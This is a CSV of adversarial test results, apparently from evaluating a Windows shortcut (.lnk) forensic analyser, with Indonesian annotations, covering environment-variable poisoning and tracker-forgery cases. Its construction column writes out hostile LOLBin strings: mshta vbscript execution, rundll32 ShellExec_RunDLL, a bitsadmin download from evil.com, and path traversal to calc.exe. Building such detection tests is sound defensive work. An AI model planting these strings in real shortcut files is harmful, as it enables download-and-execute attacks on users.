sample_id,category,variant,construction,ground_truth,system_status,system_detail,system_correct,failure_mode,sha256
ADV_ENV_POISON_mshta_10,ENV_POISON,mshta,ENV='mshta.exe vbscript:CreateObject('WScript.Shell').Run(0)' (LOLBin mshta bukan di daftar),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,20b4a06be2e3e0c33cf51cd5e0eb0013c6bbc2c85792130386087d3652b05dd8
ADV_ENV_POISON_mshta_11,ENV_POISON,mshta,ENV='mshta.exe vbscript:CreateObject('WScript.Shell').Run(0)' (LOLBin mshta bukan di daftar),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,7d73b0e21e2559329e84401f3ea081c080eeb423216afbd46cc36dcadb9ed198
ADV_ENV_POISON_rundll32_00,ENV_POISON,rundll32,"ENV='rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe' (LOLBin rundll32 bukan di daftar)",command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,94fa05470b87b00ace29050d19c505fa9ce61435f69a5b3a185c400b6d94156e
ADV_ENV_POISON_rundll32_01,ENV_POISON,rundll32,"ENV='rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe' (LOLBin rundll32 bukan di daftar)",command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,62442796604ca15cbaae2cf347786be6d98294dc237b653bebae9967b10dd1d1
ADV_ENV_POISON_rundll32_02,ENV_POISON,rundll32,"ENV='rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe' (LOLBin rundll32 bukan di daftar)",command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,6a300ce28af86e1ea7de7b8532e1941737b244c7b6645efa5a0e720fbe678f62
ADV_ENV_POISON_rundll32_03,ENV_POISON,rundll32,"ENV='rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe' (LOLBin rundll32 bukan di daftar)",command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,874f7fd8a5dd5268c5cded4a3748c0642c97f5cdcd6487c6c54847dc7d035d3a
ADV_ENV_POISON_rundll32_04,ENV_POISON,rundll32,"ENV='rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe' (LOLBin rundll32 bukan di daftar)",command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,471ca60a4e2c1e271ddf7eb90b08921f7b2bc4731cb080d4c22fb7a242262ea0
ADV_ENV_POISON_rundll32_05,ENV_POISON,rundll32,"ENV='rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe' (LOLBin rundll32 bukan di daftar)",command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,9374eb2ce5d8d8bf52566e9d105ea02f4ce791bdb2483b15ba748b59dd2effab
ADV_ENV_POISON_rundll32_06,ENV_POISON,rundll32,"ENV='rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe' (LOLBin rundll32 bukan di daftar)",command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,1e4ee72dcb845534ad938331d0bc4e37fe06e098f074deb3553abf0a1ff3d054
ADV_ENV_POISON_rundll32_07,ENV_POISON,rundll32,"ENV='rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe' (LOLBin rundll32 bukan di daftar)",command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,586bb76d0c5adfc696916eef6d8752c24a700d53a9347c96f4c7ad0b876e02fc
ADV_ENV_POISON_rundll32_08,ENV_POISON,rundll32,"ENV='rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe' (LOLBin rundll32 bukan di daftar)",command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,3e6a8f7979e51bb1acc684c408e47d6c4f1be7503fb01348f6db1c0b8d0cfd5f
ADV_ENV_POISON_rundll32_09,ENV_POISON,rundll32,"ENV='rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe' (LOLBin rundll32 bukan di daftar)",command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,e15e90dbf9476f5b6e5ad1ddeb6940f7c0d38fb40d3336dd9d99e8a81f3331a9
ADV_ENV_POISON_rundll32_10,ENV_POISON,rundll32,"ENV='rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe' (LOLBin rundll32 bukan di daftar)",command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,6409901c23abea9a5f5dee6d093d13ee1cedfec23cb288efc20c2da8b699c7e9
ADV_ENV_POISON_bitsadmin_00,ENV_POISON,bitsadmin,ENV='bitsadmin.exe /transfer j http://evil.com/x.exe C:\x.exe' (LOLBin bitsadmin bukan di daftar),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,457415046be4ae37375272a0ee9979f962db9baad64b1c754884aa73e7f5bc2a
ADV_ENV_POISON_bitsadmin_01,ENV_POISON,bitsadmin,ENV='bitsadmin.exe /transfer j http://evil.com/x.exe C:\x.exe' (LOLBin bitsadmin bukan di daftar),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,283d4108787f40613fcdf183e2500561e76177d39d1dc8074c24b1d677969560
ADV_ENV_POISON_bitsadmin_02,ENV_POISON,bitsadmin,ENV='bitsadmin.exe /transfer j http://evil.com/x.exe C:\x.exe' (LOLBin bitsadmin bukan di daftar),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,3996c38a35ed578d0ab1f4be3cd6729708b0ec504429a55fd604bc71894a30c5
ADV_ENV_POISON_bitsadmin_03,ENV_POISON,bitsadmin,ENV='bitsadmin.exe /transfer j http://evil.com/x.exe C:\x.exe' (LOLBin bitsadmin bukan di daftar),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,3baa0c4e6f986f419b7ef0c68e57bace54de13fe346d5c06826bfbb9e6e26af7
ADV_ENV_POISON_bitsadmin_04,ENV_POISON,bitsadmin,ENV='bitsadmin.exe /transfer j http://evil.com/x.exe C:\x.exe' (LOLBin bitsadmin bukan di daftar),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,c9a335fc41ac573a0a9a876526d9a5ec682a4fdae7a1f89d9db0794a77a9ca9b
ADV_ENV_POISON_bitsadmin_05,ENV_POISON,bitsadmin,ENV='bitsadmin.exe /transfer j http://evil.com/x.exe C:\x.exe' (LOLBin bitsadmin bukan di daftar),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,f04f117f062a1644d947493d5a5e0ac3e520c42c3663e12ada73354c8ab0463d
ADV_ENV_POISON_bitsadmin_06,ENV_POISON,bitsadmin,ENV='bitsadmin.exe /transfer j http://evil.com/x.exe C:\x.exe' (LOLBin bitsadmin bukan di daftar),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,24b0234c498564d426a0bcb56e2badf678a7852c8bdc5775342fcdef5f99a461
ADV_ENV_POISON_bitsadmin_07,ENV_POISON,bitsadmin,ENV='bitsadmin.exe /transfer j http://evil.com/x.exe C:\x.exe' (LOLBin bitsadmin bukan di daftar),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,4df2a39e8fe954de6c38b68feff8fe305644e95364cd7d1991b5db44f7645206
ADV_ENV_POISON_bitsadmin_08,ENV_POISON,bitsadmin,ENV='bitsadmin.exe /transfer j http://evil.com/x.exe C:\x.exe' (LOLBin bitsadmin bukan di daftar),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,06125c13d1ac8bcf7dc7009694b60739c0115a1102f4c44add1822a10c4f5582
ADV_ENV_POISON_bitsadmin_09,ENV_POISON,bitsadmin,ENV='bitsadmin.exe /transfer j http://evil.com/x.exe C:\x.exe' (LOLBin bitsadmin bukan di daftar),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,e2c0b8ba27b4197aff6849fdbd60155490dda59210dfd6157ac5cfff77c89a97
ADV_ENV_POISON_bitsadmin_10,ENV_POISON,bitsadmin,ENV='bitsadmin.exe /transfer j http://evil.com/x.exe C:\x.exe' (LOLBin bitsadmin bukan di daftar),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,0604a8c87d26c090e5664079aad407b8faf6153d11aff5b8ff7ccc6576ef33ce
ADV_ENV_POISON_bitsadmin_11,ENV_POISON,bitsadmin,ENV='bitsadmin.exe /transfer j http://evil.com/x.exe C:\x.exe' (LOLBin bitsadmin bukan di daftar),command-like,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,9d90f89eace6a71d601e9273a038957b11d04f013b0e02d36cf2e5c91aab1edf
ADV_ENV_POISON_mixed_quote_00,ENV_POISON,mixed_quote,"ENV='""D:\TEL\ta\ta 3\dataset\sistemclear copy\dataset_sample\data' (path dipetik + arg)",quoted-path,CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,753cad623bde4dbc25606704b436bb4a4b68ba1e8782cec569ef7a98b054022a
ADV_ENV_POISON_mixed_quote_01,ENV_POISON,mixed_quote,"ENV='""D:\TEL\ta\ta 3\dataset\sistemclear copy\dataset_sample\data' (path dipetik + arg)",quoted-path,CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,b0ab8fc68d497e21a36264407ad079e8b6eea74a03456fea5ab9cf91d905e8e9
ADV_ENV_POISON_mixed_quote_02,ENV_POISON,mixed_quote,"ENV='""D:\TEL\ta\ta 3\dataset\sistemclear copy\dataset_sample\data' (path dipetik + arg)",quoted-path,CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,545f1acd1a78d5c6be7a5a08abe1e76d35ae59c90e319069f0c4c5492b602da8
ADV_ENV_POISON_mixed_quote_03,ENV_POISON,mixed_quote,"ENV='""D:\TEL\ta\ta 3\dataset\sistemclear copy\dataset_sample\data' (path dipetik + arg)",quoted-path,CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,87cf30e4370066d4fe3a0c4db8e2f0c3bacb69308fd933becbbefcfc4c94ede9
ADV_ENV_POISON_mixed_quote_04,ENV_POISON,mixed_quote,"ENV='""D:\TEL\ta\ta 3\dataset\sistemclear copy\dataset_sample\data' (path dipetik + arg)",quoted-path,CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,13641282e360de4becb28dff7755dad336f086f8b5170281e1ee6a3d6e5b56f9
ADV_ENV_POISON_mixed_quote_05,ENV_POISON,mixed_quote,"ENV='""D:\TEL\ta\ta 3\dataset\sistemclear copy\dataset_sample\data' (path dipetik + arg)",quoted-path,CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,fe42f688739a2af1e3ebebfc2bcfa24cc6b7d15081d721a21fbc9997b02c29bf
ADV_ENV_POISON_mixed_quote_06,ENV_POISON,mixed_quote,"ENV='""D:\TEL\ta\ta 3\dataset\sistemclear copy\dataset_sample\data' (path dipetik + arg)",quoted-path,CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,eaf4f8f64d58f8e2e1053f672025dc31e286f3a196f432c1b7ead68924aa97da
ADV_ENV_POISON_mixed_quote_07,ENV_POISON,mixed_quote,"ENV='""D:\TEL\ta\ta 3\dataset\sistemclear copy\dataset_sample\data' (path dipetik + arg)",quoted-path,CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,e56c445fb9d07f6295c73db30a57a101e8a54c7f67e03abe66984eaf7b43ebff
ADV_ENV_POISON_mixed_quote_08,ENV_POISON,mixed_quote,"ENV='""D:\TEL\ta\ta 3\dataset\sistemclear copy\dataset_sample\data' (path dipetik + arg)",quoted-path,CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,16a69b62a44617c833c236b424fcab988778c4d15b06a158a0337d708b54bcff
ADV_ENV_POISON_mixed_quote_09,ENV_POISON,mixed_quote,"ENV='""D:\TEL\ta\ta 3\dataset\sistemclear copy\dataset_sample\data' (path dipetik + arg)",quoted-path,CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,d949af4fa307960409a5c92e0a526955ae1aa570e4b74cb83acd61e1434277f2
ADV_ENV_POISON_mixed_quote_10,ENV_POISON,mixed_quote,"ENV='""D:\TEL\ta\ta 3\dataset\sistemclear copy\dataset_sample\data' (path dipetik + arg)",quoted-path,CONSISTENT,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONSISTENT tracker=NO_TRACKER/None cf=[],TRUE,,c1720299eda71d3327b9c72f03b12b84bfcba0d4c69bb6daf7b0b594a4fc1b96
ADV_ENV_POISON_inner_quote_00,ENV_POISON,inner_quote,ENV='D:\TEL\ta\ta 3\dataset\sistemclear copy\dataset_sample\datas' (quote di dalam path),quoted-path,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,3d803be2c80dbed75239fac3a6769c3952b54abbd027b1952903a9a8c71f588f
ADV_ENV_POISON_inner_quote_01,ENV_POISON,inner_quote,ENV='D:\TEL\ta\ta 3\dataset\sistemclear copy\dataset_sample\datas' (quote di dalam path),quoted-path,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,c1a65830a321f0eb123363231138ea0485038ec2b4e8f6e6beed1080f87076b2
ADV_ENV_POISON_inner_quote_02,ENV_POISON,inner_quote,ENV='D:\TEL\ta\ta 3\dataset\sistemclear copy\dataset_sample\datas' (quote di dalam path),quoted-path,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,c444807f03c7bce632aa689eb48eb514ad51c8f5749ef29b0c75477f5eb2285e
ADV_ENV_POISON_inner_quote_03,ENV_POISON,inner_quote,ENV='D:\TEL\ta\ta 3\dataset\sistemclear copy\dataset_sample\datas' (quote di dalam path),quoted-path,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,12917036094b0b6e840ced8b15d0653155de9347f7aa83644c4120bd60e77bca
ADV_ENV_POISON_inner_quote_04,ENV_POISON,inner_quote,ENV='D:\TEL\ta\ta 3\dataset\sistemclear copy\dataset_sample\datas' (quote di dalam path),quoted-path,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,426deecf7e920c6c71ea9095e6d73eb24e353c99f11b5674ba7d29639ac30a83
ADV_ENV_POISON_inner_quote_05,ENV_POISON,inner_quote,ENV='D:\TEL\ta\ta 3\dataset\sistemclear copy\dataset_sample\datas' (quote di dalam path),quoted-path,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,50c37132074ed6cf2d861c72c96de818aa80617d69dcc254fd64a187203708c3
ADV_ENV_POISON_inner_quote_06,ENV_POISON,inner_quote,ENV='D:\TEL\ta\ta 3\dataset\sistemclear copy\dataset_sample\datas' (quote di dalam path),quoted-path,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,95dd890a14e91c9ba2bc789f671b93b3d8f8aed0d06080291e5f8ddea6f04959
ADV_ENV_POISON_inner_quote_07,ENV_POISON,inner_quote,ENV='D:\TEL\ta\ta 3\dataset\sistemclear copy\dataset_sample\datas' (quote di dalam path),quoted-path,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,1d6f8a2ad51248833cb0904c85bf3d4a53b77bc54b2da00734790a697fc40bb6
ADV_ENV_POISON_inner_quote_08,ENV_POISON,inner_quote,ENV='D:\TEL\ta\ta 3\dataset\sistemclear copy\dataset_sample\datas' (quote di dalam path),quoted-path,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,b8f799b817619d29857944d8b06101babe987082c4146838b2c2cf4575af60b2
ADV_ENV_POISON_inner_quote_09,ENV_POISON,inner_quote,ENV='D:\TEL\ta\ta 3\dataset\sistemclear copy\dataset_sample\datas' (quote di dalam path),quoted-path,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,d39736c7a5c6b2ac3609353d8ae0be4d7669850eee64d7bfda35066baab0e0c7
ADV_ENV_POISON_inner_quote_10,ENV_POISON,inner_quote,ENV='D:\TEL\ta\ta 3\dataset\sistemclear copy\dataset_sample\datas' (quote di dalam path),quoted-path,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,23c1b8ea713a992e621c13840b08487b0a1c736abdaa312eab77aafb6eaa5dcb
ADV_ENV_POISON_inner_quote_11,ENV_POISON,inner_quote,ENV='D:\TEL\ta\ta 3\dataset\sistemclear copy\dataset_sample\datas' (quote di dalam path),quoted-path,CONFLICTING,ui_status=CONSISTENT ui=LinkTargetIDList exec=LinkTargetIDList class=CONFLICTING tracker=NO_TRACKER/None cf=['EnvironmentVariableDataBlock'],TRUE,,1aa0f6ae3b570e188bc819b9062a821446e6dd5f18b6fd1ce97f5b2ddc433b9f
ADV_ENV_POISON_broken_expand_00,ENV_POISON,broken_expand,ENV='%USERPROFILE%\..\..\Windows\System32\calc.exe' (traversal keluar userprofile),info (state_env=PRESENT_NORMAL_NOT_FOUND),CONFLICTING,ui_status=CONSISTENT ui=EnvironmentVariableDataBlock exec=EnvironmentVariableDataBlock class=CONFLICTING tracker=NO_TRACKER/None cf=['LinkTargetIDList'],INFO,,5459ac48a9d5d6ac9861bcd72958ad1414d6a4ac84716489db2dd5a7b26ede20
ADV_ENV_POISON_broken_expand_01,ENV_POISON,broken_expand,ENV='%USERPROFILE%\..\..\Windows\System32\calc.exe' (traversal keluar userprofile),info (state_env=PRESENT_NORMAL_NOT_FOUND),CONFLICTING,ui_status=CONSISTENT ui=EnvironmentVariableDataBlock exec=EnvironmentVariableDataBlock class=CONFLICTING tracker=NO_TRACKER/None cf=['LinkTargetIDList'],INFO,,1d3b6f1992f2da55b75987b008fe62f5e08fe9c677e52e85cb8ae80802fc3500
ADV_ENV_POISON_broken_expand_02,ENV_POISON,broken_expand,ENV='%USERPROFILE%\..\..\Windows\System32\calc.exe' (traversal keluar userprofile),info (state_env=PRESENT_NORMAL_NOT_FOUND),CONFLICTING,ui_status=CONSISTENT ui=EnvironmentVariableDataBlock exec=EnvironmentVariableDataBlock class=CONFLICTING tracker=NO_TRACKER/None cf=['LinkTargetIDList'],INFO,,bd236145e42eec448981f82e4e364e92571d26eb4946869eccf43402f0e314ed
ADV_ENV_POISON_broken_expand_03,ENV_POISON,broken_expand,ENV='%USERPROFILE%\..\..\Windows\System32\calc.exe' (traversal keluar userprofile),info (state_env=PRESENT_NORMAL_NOT_FOUND),CONFLICTING,ui_status=CONSISTENT ui=EnvironmentVariableDataBlock exec=EnvironmentVariableDataBlock class=CONFLICTING tracker=NO_TRACKER/None cf=['LinkTargetIDList'],INFO,,278fb8b6ee93dde6127358259a1ded6e929cfebee922d08d2b9996d3af1c8806
ADV_ENV_POISON_broken_expand_04,ENV_POISON,broken_expand,ENV='%USERPROFILE%\..\..\Windows\System32\calc.exe' (traversal keluar userprofile),info (state_env=PRESENT_NORMAL_NOT_FOUND),CONFLICTING,ui_status=CONSISTENT ui=EnvironmentVariableDataBlock exec=EnvironmentVariableDataBlock class=CONFLICTING tracker=NO_TRACKER/None cf=['LinkTargetIDList'],INFO,,988740d0f2a7bd0f6ad4ca4c5bb06888060f1263ecd087a3f7e316d355e93a49
ADV_ENV_POISON_broken_expand_05,ENV_POISON,broken_expand,ENV='%USERPROFILE%\..\..\Windows\System32\calc.exe' (traversal keluar userprofile),info (state_env=PRESENT_NORMAL_NOT_FOUND),CONFLICTING,ui_status=CONSISTENT ui=EnvironmentVariableDataBlock exec=EnvironmentVariableDataBlock class=CONFLICTING tracker=NO_TRACKER/None cf=['LinkTargetIDList'],INFO,,ea4c6057bf795aa0269aece966ee973bb20be79161f1294b8b176a426de6630e
ADV_ENV_POISON_broken_expand_06,ENV_POISON,broken_expand,ENV='%USERPROFILE%\..\..\Windows\System32\calc.exe' (traversal keluar userprofile),info (state_env=PRESENT_NORMAL_NOT_FOUND),CONFLICTING,ui_status=CONSISTENT ui=EnvironmentVariableDataBlock exec=EnvironmentVariableDataBlock class=CONFLICTING tracker=NO_TRACKER/None cf=['LinkTargetIDList'],INFO,,113ac0fcf60034a5683b3da9e109d295f48b8b0b5a32b465a6e6f84cfde0f946
ADV_ENV_POISON_broken_expand_07,ENV_POISON,broken_expand,ENV='%USERPROFILE%\..\..\Windows\System32\calc.exe' (traversal keluar userprofile),info (state_env=PRESENT_NORMAL_NOT_FOUND),CONFLICTING,ui_status=CONSISTENT ui=EnvironmentVariableDataBlock exec=EnvironmentVariableDataBlock class=CONFLICTING tracker=NO_TRACKER/None cf=['LinkTargetIDList'],INFO,,8a589a158108a7cf87f72c4e1c5da6d1c5251dfa5140ed7cedc6e0d224f9258e
ADV_ENV_POISON_broken_expand_08,ENV_POISON,broken_expand,ENV='%USERPROFILE%\..\..\Windows\System32\calc.exe' (traversal keluar userprofile),info (state_env=PRESENT_NORMAL_NOT_FOUND),CONFLICTING,ui_status=CONSISTENT ui=EnvironmentVariableDataBlock exec=EnvironmentVariableDataBlock class=CONFLICTING tracker=NO_TRACKER/None cf=['LinkTargetIDList'],INFO,,603bb759b81e30ebd8fc6d6c24227701c3af5bc874fe0be26dced5a62ba63e92
ADV_TRACKER_FORGERY_volume_spoof_00,TRACKER_FORGERY,volume_spoof,property=D: + droid->file D: nyata; UI/field lain NOT_FOUND,tracker tak boleh VALID hanya dari cocok-drive,UNKNOWN,"ui_status=UNKNOWN ui=LinkTargetIDList exec=tidak ditemukan class=UNKNOWN tracker=VALID/MOUNT_MATCH cf=['LinkTargetIDList', 'TrackerDataBlock']",FALSE,"false VALID (MOUNT_MATCH percaya drive saja, bukan identitas file)",b7a0acee6fcf6d77e9b109c3258b2ff674b1e0fb0d222066c6d169fab4bc84b2
ADV_TRACKER_FORGERY_volume_spoof_01,TRACKER_FORGERY,volume_spoof,property=D: + droid->file D: nyata; UI/field lain NOT_FOUND,tracker tak boleh VALID hanya dari cocok-drive,UNKNOWN,"ui_status=UNKNOWN ui=LinkTargetIDList exec=tidak ditemukan class=UNKNOWN tracker=VALID/MOUNT_MATCH cf=['LinkTargetIDList', 'TrackerDataBlock']",FALSE,"false VALID (MOUNT_MATCH percaya drive saja, bukan identitas file)",5fd05c87fd1b2f9cbe9628c121a0bf28b76eb1f237d4390f5cbbd199f0adb102
ADV_TRACKER_FORGERY_volume_spoof_02,TRACKER_FORGERY,volume_spoof,property=D: + droid->file D: nyata; UI/field lain NOT_FOUND,tracker tak boleh VALID hanya dari cocok-drive,UNKNOWN,"ui_status=UNKNOWN ui=LinkTargetIDList exec=tidak ditemukan class=UNKNOWN tracker=VALID/MOUNT_MATCH cf=['LinkTargetIDList', 'TrackerDataBlock']",FALSE,"false VALID (MOUNT_MATCH percaya drive saja, bukan identitas file)",f35f8a7f531522b757059c6135ab9346be3e5341dfce77943e42bffb3f8448c3
